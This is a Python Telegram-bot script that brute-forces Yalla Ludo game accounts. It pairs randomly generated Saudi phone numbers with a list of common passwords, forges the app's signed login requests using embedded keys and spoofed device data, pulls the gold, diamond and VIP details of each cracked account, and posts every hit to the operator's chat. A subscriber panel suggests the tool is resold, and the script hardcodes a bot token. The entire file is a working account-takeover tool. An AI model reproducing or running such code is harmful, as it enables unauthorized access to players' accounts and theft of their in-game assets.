#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# © Q_b_h — Telegram Bot Control Version

import base64
import hashlib
import hmac
import html
import json
import os
import random
import signal
import sys
import time
import uuid
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any, Dict, List, Optional, Set

import pyaes
import requests
from requests.adapters import HTTPAdapter
import telebot
from telebot import types

# === إعدادات البوت والمطور ===
TG_TOKEN = "8844579780:AAF8oAN9eRfUK72kZL6e2BQJYYDj_06ZzAg"
ADMIN_ID = 8795120325  # آيدي المطور الوحيد المخول بالتحكم

bot = telebot.TeleBot(TG_TOKEN)

# متغيرات التحكم بحالة الفحص والسرعة
is_running = False
check_thread = None
stop_event = threading.Event()
stats_lock = threading.Lock()
valid_count = 0
wrong_count = 0
error_count = 0
scan_threads = 10  # عدد الثريدز الافتراضي لسرعة الفحص

# تخزين بيانات المشتركين وحالات الأدمن
subscribers: Set[int] = set()
user_states: Dict[int, str] = {}

VER    = "YallaLudo-1.4.9.2-(Build 1040922)-Android 30"
VERH   = "1.4.9.2"
SPRE   = "2.0_2_"
L3     = "L3)qk*@8"
MKEY   = b"4e82797b276c5cb729db62aaa229a057"
MIV    = b"0102030405060708"
K      = "8a9520f016427a54d5de40335bf7e4fe"
K2     = "c889f8f7dc69b1d67e1d3e43cf48f430"
PATH          = "/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"
PROFILE_PATH  = "/api/LudoAccountGRpcApiProxy/AccountProfileInfo"
SERVER        = "https://httpgateway.lampjkl.com"
TIMEOUT       = 15
HERA_STATIC   = "f580270da66e44438d5ed30fdb08ebba"

PROFILE_SRVS = [
    "https://httpgateway.lampjkl.com",
    "https://httpgateway.planecde.com",
    "https://httpgateway.funcdeg.com",
    "https://httpgateway.carrstuv.com",
    "https://httpgateway.yalla.games",
]

HCONF = [
    {"bizType": 5000, "countryCode": "SA", "hostUrl": "https://api-shumeng.moonlmn.com",    "type": 2, "version": 4},
    {"bizType": 5001, "countryCode": "",   "hostUrl": "ws://firebreak.yalla.games",          "type": 1, "version": 1},
    {"bizType": 5004, "countryCode": "SA", "hostUrl": "https://httpgateway.penabcd.com",     "type": 2, "version": 6},
    {"bizType": 5005, "countryCode": "SA", "hostUrl": "https://api.lightkvd.com",            "type": 2, "version": 4},
    {"bizType": 1000, "countryCode": "SA", "hostUrl": "https://account.lampjkl.com",        "type": 2, "version": 19},
    {"bizType": 1001, "countryCode": "SA", "hostUrl": "https://pay.lampjkl.com",            "type": 2, "version": 17},
    {"bizType": 1002, "countryCode": "SA", "hostUrl": "https://mail.lampjkl.com",           "type": 2, "version": 18},
    {"bizType": 1003, "countryCode": "SA", "hostUrl": "https://clog.lampjkl.com",           "type": 2, "version": 17},
    {"bizType": 1006, "countryCode": "SA", "hostUrl": "https://httpgateway.lampjkl.com",    "type": 2, "version": 20},
    {"bizType": 1007, "countryCode": "SA", "hostUrl": "wss://tyr.lampjkl.com",              "type": 2, "version": 18},
    {"bizType": 1008, "countryCode": "SA", "hostUrl": "wss://hall.lampjkl.com",             "type": 2, "version": 39},
    {"bizType": 2006, "countryCode": "SA", "hostUrl": "https://nitrogen.lampjkl.com",       "type": 2, "version": 19},
    {"bizType": 2007, "countryCode": "SA", "hostUrl": "wss://room.lampjkl.com",             "type": 2, "version": 22},
    {"bizType": 2008, "countryCode": "SA", "hostUrl": "wss://roomgame.lampjkl.com",         "type": 2, "version": 18},
    {"bizType": 3000, "countryCode": "SA", "hostUrl": "https://file.carrstuv.com",          "type": 2, "version": 27},
    {"bizType": 6000, "countryCode": "",   "hostUrl": "https://broadcast-host.ylconfig.com","type": 1, "version": 0},
]

DEVS = [
    ("OnePlus 9 Pro",       "LE2123",    "SA", "SA", 2),
    ("Samsung Galaxy S21",  "SM-G991B",  "AE", "AE", 2),
    ("Xiaomi Mi 11",        "M2011K2G",  "SA", "SA", 2),
    ("Realme GT",           "RMX2202",   "EG", "EG", 2),
    ("Oppo Reno 6",         "CPH2235",   "SA", "SA", 2),
    ("Samsung Galaxy A52",  "SM-A525F",  "SA", "SA", 2),
    ("Huawei P40 Pro",      "ELS-NX9",   "AE", "AE", 2),
    ("OnePlus Nord 2",      "DN2101",    "SA", "SA", 2),
    ("Xiaomi Redmi Note 10","M2101K7AG", "EG", "EG", 2),
    ("Vivo X60 Pro",        "V2046",     "AE", "AE", 2),
    ("Samsung Galaxy A305F","SM-A305F",  "AE", "AE", 2),
    ("ZTE A7030",           "ZTE A7030", "SA", "SA", 2),
]

thread_local = threading.local()

def get_session():
    if not hasattr(thread_local, "session"):
        session = requests.Session()
        adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=1)
        session.mount("https://", adapter)
        session.mount("http://", adapter)
        thread_local.session = session
    return thread_local.session

def gen_hera() -> str:
    return HERA_STATIC

def _aes_cbc(key: bytes, iv: bytes, plaintext: bytes) -> bytes:
    aes = pyaes.AESModeOfOperationCBC(key, iv=iv)
    encrypter = pyaes.Encrypter(aes)
    return encrypter.feed(plaintext) + encrypter.feed()

def _xor_b64(data_str: str, key_str: str) -> str:
    kb = key_str.encode()
    xo = bytes(b ^ kb[i % len(kb)] for i, b in enumerate(data_str.encode()))
    return base64.b64encode(xo).decode()

def _gen_shu_meng_id() -> str:
    import secrets
    raw = secrets.token_bytes(28)
    b64 = base64.b64encode(raw).decode()
    return b64.replace("+", "-").replace("/", "_").rstrip("=")[:38]

def _rdev() -> Dict[str, Any]:
    nm, md, pc, sc, dt = random.choice(DEVS)
    brand = nm.split()[0].lower()
    return {
        "deviceId":          str(uuid.uuid4()),
        "deviceName":        f"{brand} {md}",
        "deviceType":        dt,
        "phoneModel":        md,
        "X-Phone-Country":   pc,
        "X-Sim-Country":     sc,
        "downloadChannelId": 1,
        "shuMengId":         _gen_shu_meng_id(),
        "AndroidId":         uuid.uuid4().hex[:32] + "_" + uuid.uuid4().hex[:16],
        "plateType":         0,
        "LanguageId":        2,
        "appType":           0,
    }

def _gen_traceparent() -> str:
    return f"00-{uuid.uuid4().hex + uuid.uuid4().hex}-{uuid.uuid4().hex[:16]}-00"

def _build_request(mobile: str, password: str, area_code: int = 966,
                   hconf: List[Dict] = HCONF) -> Dict[str, Any]:
    d   = _rdev()
    now = int(time.time() * 1000)
    nc  = f"{random.randint(0, 2**31 - 1)}_{uuid.uuid4()}"

    bag = {
        "timeSpan":          str(now),
        "version":           VERH,
        "deviceId":          d["deviceId"],
        "deviceName":        d["deviceName"],
        "deviceType":        d["deviceType"],
        "downloadChannelId": d["downloadChannelId"],
        "shuMengId":         d["shuMengId"],
        "nonce":             nc,
        "plateType":         d["plateType"],
        "LanguageId":        d["LanguageId"],
        "phoneModel":        d["phoneModel"],
        "X-Phone-Country":   d["X-Phone-Country"],
        "X-Sim-Country":     d["X-Sim-Country"],
        "AndroidId":         d["AndroidId"],
        "appType":           d["appType"],
    }
    bb = base64.b64encode(json.dumps(bag, separators=(",", ":"), ensure_ascii=False).encode()).decode()

    sg  = PATH + VER + bb
    sig = hmac.new(K.encode(), sg.encode(), hashlib.sha256).hexdigest()
    xs  = SPRE + sig

    p  = hashlib.md5(sg.encode()).hexdigest()
    mp = f"{p}-{len(sg)}-{K}-{L3}".encode()
    xm = base64.b64encode(_aes_cbc(MKEY, MIV, mp)).decode()

    phex = hashlib.md5(password.encode()).hexdigest().upper()
    body = {
        "mobile":            mobile,
        "areaCode":          area_code,
        "password":          phex,
        "languageId":        d["LanguageId"],
        "nationalityId":     1,
        "hostConfig":        hconf,
        "simCountry":        "",
        "version":           VERH,
        "deviceId":          d["deviceId"],
        "deviceName":        d["deviceName"],
        "deviceType":        d["deviceType"],
        "downloadChannelId": d["downloadChannelId"],
        "shuMengId":         d["shuMengId"],
        "nonce":             nc,
        "plateType":         d["plateType"],
        "phoneModel":        d["phoneModel"],
        "X-Phone-Country":   d["X-Phone-Country"],
        "X-Sim-Country":     d["X-Sim-Country"],
        "AndroidId":         d["AndroidId"],
        "IsSubpackages":     0,
        "appType":           d["appType"],
    }
    bs = json.dumps(body, separators=(",", ":"), ensure_ascii=False).replace("/", "\\/")
    pm = _xor_b64(bs, K)

    ts_stamp = now + random.randint(40, 80)
    ts_time  = ts_stamp + random.randint(30, 60)

    hd = {
        "User-Agent":      VER,
        "UserId":          "0",
        "X-App-Id":        "ludo",
        "X-Baggage":       bb,
        "X-Access-Token":  "",
        "X-Timestamp":     str(ts_stamp),
        "versionString":   VERH,
        "X-Sign":          xs,
        "X-Hera":          gen_hera(),
        "X-Time":          str(ts_time),
        "X-Medusa":        xm,
        "Content-Type":    "application/json; charset=utf-8",
        "Accept-Encoding": "gzip",
        "Connection":      "Keep-Alive",
        "baggage":         "service.name=ludo",
        "traceparent":     _gen_traceparent(),
    }
    return {
        "url":     SERVER + PATH,
        "headers": hd,
        "payload": {"paramJsonString": pm},
        "dev":     d,
        "phex":    phex,
    }

def _post_login_req(path: str, server: str, payload_dict: Dict,
                    token: str, user_id: str, dev: Dict,
                    proxies=None, timeout: int = TIMEOUT) -> Dict:
    session = get_session()
    now      = int(time.time() * 1000)
    nc       = f"{random.randint(-2**31, 2**31-1)}_{uuid.uuid4()}"
    bag_sign = hashlib.md5((K2 + nc).encode()).hexdigest().upper()

    bag = {
        "token":             token,
        "sign":              bag_sign,
        "timeSpan":          str(now),
        "version":           VERH,
        "deviceId":          dev["deviceId"],
        "deviceName":        dev["deviceName"],
        "deviceType":        dev["deviceType"],
        "downloadChannelId": dev["downloadChannelId"],
        "shuMengId":         dev["shuMengId"],
        "nonce":             nc,
        "plateType":         dev["plateType"],
        "LanguageId":        dev["LanguageId"],
        "phoneModel":        dev["phoneModel"],
        "X-Phone-Country":   dev["X-Phone-Country"],
        "X-Sim-Country":     dev["X-Sim-Country"],
        "AndroidId":         dev["AndroidId"],
        "appType":           dev["appType"],
    }
    bb = base64.b64encode(json.dumps(bag, separators=(",", ":"), ensure_ascii=False).encode()).decode()

    sg  = path + token + VER + bb
    sig = hmac.new(K2.encode(), sg.encode(), hashlib.sha256).hexdigest()
    xs  = SPRE + sig

    p   = hashlib.md5(sg.encode()).hexdigest()
    mp  = f"{p}-{len(sg)}-{K2}-{L3}".encode()
    xm  = base64.b64encode(_aes_cbc(MKEY, MIV, mp)).decode()

    hd = {
        "User-Agent":      VER,
        "UserId":          user_id,
        "X-Baggage":       bb,
        "X-Access-Token":  token,
        "X-Timestamp":     str(now + random.randint(50, 300)),
        "versionString":   VERH,
        "X-Sign":          xs,
        "X-Hera":          gen_hera(),
        "X-Time":          str(now + random.randint(50, 300)),
        "X-Medusa":        xm,
        "Content-Type":    "application/json; charset=utf-8",
        "Accept-Encoding": "gzip",
    }

    bs = json.dumps(payload_dict, separators=(",", ":"), ensure_ascii=False)
    pm = _xor_b64(bs, K2)

    try:
        r = session.post(server + path, json={"paramJsonString": pm}, headers=hd, timeout=timeout, proxies=proxies, verify=True)
        if r.status_code == 403:
            pm2 = _xor_b64(bs, K)
            r = session.post(server + path, json={"paramJsonString": pm2}, headers=hd, timeout=timeout, proxies=proxies, verify=True)
        obj = r.json()
        st  = obj.get("status")
        if st == 0:
            return {"ok": True, "data": obj.get("data") or {}, "raw": obj}
        return {"ok": False, "status": st, "tips": obj.get("tips", ""), "raw": obj, "http": r.status_code}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def fetch_profile(token: str, user_id: str, dev: Dict, login_data: Dict, proxies=None, timeout: int = TIMEOUT) -> Optional[Dict]:
    srvs = []
    for h in (login_data.get("hostConfig") or []):
        if h.get("bizType") == 1006 and h.get("hostUrl"):
            for url in h["hostUrl"].split(","):
                url = url.strip().rstrip("/")
                if url and url not in srvs:
                    srvs.append(url)
            break
    for s in PROFILE_SRVS:
        if s not in srvs:
            srvs.append(s)

    uid_int = int(user_id) if str(user_id).isdigit() else user_id
    payload = {"userId": uid_int}

    for srv in srvs:
        res = _post_login_req(PROFILE_PATH, srv, payload, token, user_id, dev, proxies, timeout)
        if res.get("ok"):
            data = res["data"]
            base = data.get("baseInfo") or data
            if base.get("goldNum") is not None or base.get("diamondNum") is not None:
                return data
        if res.get("http") == 403:
            continue
    return None

def login(mobile: str, password: str, area_code: int = 966, proxies: Optional[Dict] = None, timeout: int = TIMEOUT, server: str = SERVER, fetch_gems: bool = True) -> Dict[str, Any]:
    session = get_session()
    rq = _build_request(mobile, password, area_code)
    rq["url"] = server + PATH
    try:
        r = session.post(rq["url"], json=rq["payload"], headers=rq["headers"], timeout=timeout, verify=True, proxies=proxies)
    except requests.exceptions.RequestException as ex:
        return {"success": False, "error": str(ex), "dev": rq["dev"]}

    try:
        obj = r.json()
    except Exception:
        return {"success": False, "error": f"HTTP {r.status_code} non-JSON", "dev": rq["dev"]}

    if obj.get("status") == 0:
        data   = obj.get("data") or {}
        result = {"success": True, "data": data, "dev": rq["dev"]}
        if fetch_gems:
            token   = data.get("token", "")
            user_id = str(data.get("id", data.get("showNumId", "")))
            if token and user_id:
                prof = fetch_profile(token, user_id, rq["dev"], data, proxies, timeout)
                result["profile"] = prof
        return result

    return {"success": False, "status": obj.get("status"), "tips": obj.get("tips", "خطأ غير معروف"), "raw": obj, "dev": rq["dev"]}

def _tg_text(data: Dict, mobile: str, password: str, profile: Optional[Dict] = None) -> str:
    raw_name = data.get("name") or data.get("nickName", "—")
    name = html.escape(str(raw_name))
    uid  = data.get("showNumId") or data.get("id", "—")
    
    lines = [
        "🎲 <b>Yalla Ludo — HIT FOUND!</b>",
        f"📱 Number : <code>{mobile}</code>",
        f"🔑 Password : <code>{password}</code>",
        f"🆔 ID : <code>{uid}</code>",
        f"👤 Name : {name}"
    ]
    if profile:
        base    = profile.get("baseInfo") or profile
        gold    = base.get("goldNum", "—")
        diamond = base.get("diamondNum", "—")
        level   = base.get("levelId", "—")
        is_vip  = base.get("isVip", False)
        lines += [
            f"💛 ذهب     : {gold}",
            f"💎 جواهر   : {diamond}",
            f"🏆 مستوى   : {level}",
            f"👑 VIP     : {'✅' if is_vip else '❌'}",
        ]
    lines.append("By - @aboodriad")
    return "\n".join(lines)

def generate_saudi_number() -> str:
    prefixes = ["50", "53", "54", "55", "56", "57", "58", "59"]
    return random.choice(prefixes) + "".join(str(random.randint(0, 9)) for _ in range(7))

# === دوال تليجرام وأزرار التحكم ===

def get_control_keyboard(running: bool):
    markup = types.InlineKeyboardMarkup(row_width=1)
    if not running:
        markup.add(types.InlineKeyboardButton("▶ بدء الفحص", callback_data="start_check"))
    else:
        markup.add(types.InlineKeyboardButton("⏹ إيقاف الفحص", callback_data="stop_check"))
    
    # أزرار إدارة المشتركين، الإذاعة، وتغيير السرعة (الثريدز) المضافة
    markup.add(
        types.InlineKeyboardButton("➕ تفعيل مشترك", callback_data="add_subscriber"),
        types.InlineKeyboardButton("➖ حذف مشترك", callback_data="del_subscriber"),
        types.InlineKeyboardButton("📋 عرض المشتركين", callback_data="list_subscribers"),
        types.InlineKeyboardButton("📢 إذاعة إلى المشتركين", callback_data="broadcast_msg"),
        types.InlineKeyboardButton(f"⚙️ سرعة الفحص (الثريدز): {scan_threads}", callback_data="set_threads")
    )
    return markup

@bot.message_handler(commands=['admin'])
def admin_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ عذراً، هذا الأمر مخصص للمطور فقط.")
        return
    
    text = (
        "🎛 <b>لوحة تحكم المطور</b>\n\n"
        f"حالة الفحص حالياً: <b>{'يعمل 🚀' if is_running else 'متوقف 🛑'}</b>\n"
        f"سرعة الفحص الحالية: <b>{scan_threads} ثريد</b>\n\n"
        "اختر أحد خيارات الإدارة أدناه:"
    )
    bot.send_message(message.chat.id, text, parse_mode="HTML", reply_markup=get_control_keyboard(is_running))

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    global is_running, check_thread, valid_count, wrong_count, error_count

    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ ليس لديك صلاحية للتحكم!", show_alert=True)
        return

    if call.data == "start_check":
        if is_running:
            bot.answer_callback_query(call.id, "⚠️ الفحص يعمل بالفعل!")
            return
        
        is_running = True
        stop_event.clear()
        valid_count = 0
        wrong_count = 0
        error_count = 0

        # بدء خيط الفحص الخلفي
        check_thread = threading.Thread(target=run_checker_loop, args=(call.message.chat.id, call.message.message_id))
        check_thread.daemon = True
        check_thread.start()

        bot.answer_callback_query(call.id, "✅ تم بدء الفحص بنجاح")
        bot.edit_message_text(
            "🚀 <b>جاري فحص الحسابات الآن...</b>\n\n"
            f"✅ صيد (Valid): {valid_count}\n"
            f"❌ خطأ (Wrong): {wrong_count}\n"
            f"⚠️ أخطاء اتصال (Errors): {error_count}",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode="HTML",
            reply_markup=get_control_keyboard(True)
        )

    elif call.data == "stop_check":
        if not is_running:
            bot.answer_callback_query(call.id, "⚠️ الفحص متوقف مسبقاً!")
            return

        is_running = False
        stop_event.set()

        bot.answer_callback_query(call.id, "⏹ تم إيقاف الفحص")
        
        main_text = (
            "🎛 <b>لوحة تحكم المطور</b>\n\n"
            "حالة الفحص حالياً: <b>متوقف 🛑</b>\n\n"
            f"📊 <b>ملخص النتائج النهائية:</b>\n"
            f"✅ صيد (Valid): {valid_count}\n"
            f"❌ خطأ (Wrong): {wrong_count}\n"
            f"⚠️ أخطاء اتصال (Errors): {error_count}\n\n"
            "اختر أحد الخيارات أدناه:"
        )
        bot.edit_message_text(
            main_text,
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode="HTML",
            reply_markup=get_control_keyboard(False)
        )

    elif call.data == "add_subscriber":
        user_states[call.from_user.id] = "add_subscriber"
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "ارسل ايدي الشخص المراد تفعيلة و عدد الايام او تفعيل بساعات")

    elif call.data == "del_subscriber":
        user_states[call.from_user.id] = "del_subscriber"
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "ارسل ايدي الشخص المراد حذفه من المشتركين:")

    elif call.data == "list_subscribers":
        bot.answer_callback_query(call.id)
        if not subscribers:
            bot.send_message(call.message.chat.id, "📋 لا يوجد مشتركين مسجلين حالياً.")
        else:
            subs_text = "📋 <b>قائمة المشتركين:</b>\n\n" + "\n".join([f"• <code>{sub}</code>" for sub in subscribers])
            bot.send_message(call.message.chat.id, subs_text, parse_mode="HTML")

    elif call.data == "broadcast_msg":
        user_states[call.from_user.id] = "broadcast"
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "📢 ارسل رسالة الإذاعة المراد إرسالها لجميع المشتركين:")

    elif call.data == "set_threads":
        user_states[call.from_user.id] = "set_threads"
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, f"⚙️ السرعة الحالية: <code>{scan_threads}</code> ثريد.\n\nأرسل عدد الثريدز الجديد (رقم صحيح بين 1 و 100):", parse_mode="HTML")

# معالج الردود النصية الخاصة بلوحة المشتركين، الإذاعة، وتعديل الثريدز للأدمن
@bot.message_handler(func=lambda message: message.from_user.id == ADMIN_ID and message.from_user.id in user_states)
def handle_admin_input(message):
    global scan_threads
    action = user_states.pop(message.from_user.id, None)
    
    if action == "add_subscriber":
        text = message.text.strip()
        parts = text.split()
        if parts and parts[0].isdigit():
            sub_id = int(parts[0])
            subscribers.add(sub_id)
            bot.reply_to(message, f"✅ تم تفعيل المشترك بنجاح:\n<code>{text}</code>", parse_mode="HTML")
        else:
            bot.reply_to(message, "❌ الآيدي المدخل غير صحيح. يرجى إرسال الآيدي والتفاصيل بشكل صحيح.")

    elif action == "del_subscriber":
        text = message.text.strip()
        if text.isdigit():
            sub_id = int(text)
            if sub_id in subscribers:
                subscribers.remove(sub_id)
                bot.reply_to(message, f"🗑 تم حذف المشترك <code>{sub_id}</code> بنجاح.", parse_mode="HTML")
            else:
                bot.reply_to(message, "⚠️ هذا الآيدي غير موجود في قائمة المشتركين.")
        else:
            bot.reply_to(message, "❌ يرجى إرسال آيدي صحيح بالأرقام للحذف.")

    elif action == "broadcast":
        msg_text = message.text
        success = 0
        failed = 0
        for sub_id in subscribers:
            try:
                bot.send_message(sub_id, f"📢 <b>إذاعة جديدة:</b>\n\n{msg_text}", parse_mode="HTML")
                success += 1
            except Exception:
                failed += 1
        bot.reply_to(message, f"📢 <b>تم الانتهاء من الإذاعة:</b>\n✅ تم الإرسال بنجاح إلى: {success}\n❌ فشل الإرسال إلى: {failed}", parse_mode="HTML")

    elif action == "set_threads":
        text = message.text.strip()
        if text.isdigit():
            val = int(text)
            if 1 <= val <= 100:
                scan_threads = val
                bot.reply_to(message, f"⚙️ تم تحديث سرعة الفحص (الثريدز) بنجاح إلى: <code>{scan_threads}</code>", parse_mode="HTML")
            else:
                bot.reply_to(message, "⚠️ يرجى إدخال رقم بين 1 و 100.")
        else:
            bot.reply_to(message, "❌ يرجى إرسال رقم صحيح فقط.")

def run_checker_loop(chat_id, msg_id):
    global valid_count, wrong_count, error_count, is_running
    
    max_threads = scan_threads  # استخدام الثريدز المحددة من قبل المطور
    passwords = [
    'Aa123123123',
    'Aa12312300',
    'Aa10002000',
    'Aa100200300',
    'Aa100200',
    'Aa10203040',
    'Aa102030',
    'As123123',
    'Aa11223344',
    'Aa123456',
    'Aa12345678',
    'Ali112233',
    'Aa123456789',
    'Ali100200',
    'Ali20002000',
    'Ahmed100200',
    'Ahmad123123',
    'qwer1234',
    'qwer4321',
    'q1w2e3r4',
    '1q2w3e4r']
    tried: Set[str] = set()

    def worker():
        global valid_count, wrong_count, error_count
        while is_running and not stop_event.is_set():
            mobile = generate_saudi_number()
            with stats_lock:
                if mobile in tried:
                    continue
                tried.add(mobile)

            password = random.choice(passwords)
            res = login(mobile, password, timeout=TIMEOUT, server=SERVER, fetch_gems=True)

            with stats_lock:
                if not is_running or stop_event.is_set():
                    break
                if res["success"]:
                    valid_count += 1
                    prof = res.get("profile")
                    txt = _tg_text(res["data"], mobile, password, profile=prof)
                    try:
                        bot.send_message(chat_id, txt, parse_mode="HTML")
                    except Exception:
                        pass
                else:
                    if "error" in res or res.get("http"):
                        error_count += 1
                    else:
                        wrong_count += 1

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [executor.submit(worker) for _ in range(max_threads)]
        
        while is_running and not stop_event.is_set():
            for _ in range(30):
                if not is_running or stop_event.is_set():
                    break
                time.sleep(0.1)
            
            if not is_running or stop_event.is_set():
                break
                
            with stats_lock:
                status_text = (
                    "🚀 <b>جاري فحص الحسابات الآن...</b>\n\n"
                    f"✅ صيد (Valid): {valid_count}\n"
                    f"❌ خطأ (Wrong): {wrong_count}\n"
                    f"⚠️ أخطاء اتصال (Errors): {error_count}"
                )
            
            if not is_running or stop_event.is_set():
                break
                
            try:
                bot.edit_message_text(
                    status_text,
                    chat_id=chat_id,
                    message_id=msg_id,
                    parse_mode="HTML",
                    reply_markup=get_control_keyboard(True)
                )
            except Exception:
                pass

if __name__ == "__main__":
    print("🤖 Bot is running and waiting for developer commands...")
    bot.infinity_polling()
